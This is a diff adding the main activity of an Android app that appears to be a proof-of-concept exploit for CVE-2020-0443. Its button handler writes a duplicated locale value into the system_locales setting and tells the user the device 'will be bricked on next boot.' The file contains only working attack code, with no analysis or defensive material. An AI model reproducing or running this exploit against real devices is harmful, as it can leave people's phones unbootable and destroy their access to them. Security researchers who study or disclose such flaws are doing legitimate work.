@@ -1,0 +1,25 @@
+package poc.sithija.cve_2020_0443;
+
+import android.provider.Settings;
+import android.support.v7.app.AppCompatActivity;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Toast;
+
+public class MainActivity extends AppCompatActivity {
+    public void settingChange(View view){
+        try {
+            final boolean stat = Settings.System.putString(getContentResolver(), "system_locales", "en_US,en_US");
+            if (stat)
+                Toast.makeText(getApplicationContext(), "Success! Device will be bricked on next boot.", Toast.LENGTH_LONG).show();
+            else Toast.makeText(getApplicationContext(), "Unknown error", Toast.LENGTH_LONG).show();
+        } catch (Exception e){
+            Toast.makeText(getApplicationContext(), "Exception changing settings: " + e.getMessage(), Toast.LENGTH_LONG).show();
+        }
+    }
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+}
